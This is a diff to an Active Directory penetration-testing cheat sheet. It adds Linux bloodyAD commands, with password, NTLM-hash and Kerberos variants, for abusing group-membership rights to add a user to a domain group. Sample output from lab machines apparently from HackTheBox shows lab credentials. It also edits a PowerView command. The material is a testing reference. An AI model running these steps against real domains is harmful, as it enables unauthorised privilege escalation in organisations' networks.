@@ -236,10 +236,42 @@ Certipy v5.0.2 - by Oliver Lyak (ly4k)
 
 ### Abuse #3 : Add User to Group
 
-{{< tab set4 tab1 >}}Windows{{< /tab >}}
+{{< tab set4 tab1 >}}Linux{{< /tab >}}
+{{< tab set4 tab2 >}}Windows{{< /tab >}}
 {{< tabcontent set4 tab1 >}}
 
+#### 1. Add User to Group
+
+```console
+# Password
+bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> --dc-ip <DC_IP> add groupMember '<GROUP>' '<USER>'
+```
+
+```console {class="sample-code"}
+$ bloodyAD -d rebound.htb -u 'oorend' -p '1GR8t@$$4u' --host 10.10.11.231 add groupMember SERVICEMGMT 'oorend'
+[+] oorend added to SERVICEMGMT
+```
+
+```console
+# NTLM
+bloodyAD -d <DOMAIN> -u '<USER>' -p '<HASH>' -f rc4 -k --host <DC> --dc-ip <DC_IP> add groupMember '<GROUP>' '<USER>'
+```
+
+```console
+# Kerberos
+bloodyAD -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> --dc-ip <DC_IP> add groupMember '<GROUP>' '<USER>'
+```
+
+```console {class="sample-code"}
+$ bloodyAD -d absolute.htb -u 'm.lovegod' -p 'AbsoluteLDAP2022!' -k --host dc.absolute.htb add groupMember 'NETWORK AUDIT' 'm.lovegod'
+[+] m.lovegod added to NETWORK AUDIT
+```
+
+{{< /tabcontent >}}
+{{< tabcontent set4 tab2 >}}
+
 #### 1. Import PowerView
+
 ```console
 . .\PowerView.ps1
 ```
@@ -261,7 +293,7 @@ $cred = new-object -typename System.Management.Automation.PSCredential -argument
 #### 2. Add User to Group
 
 ```console
-Add-DomainGroupMember -Identity <TARGET_GROUP> -Members <USER> -Credential $cred
+Add-DomainGroupMember -Identity '<TARGET_GROUP>' -Members <USER> -Credential $cred
 ```
 
 {{< /tabcontent >}}
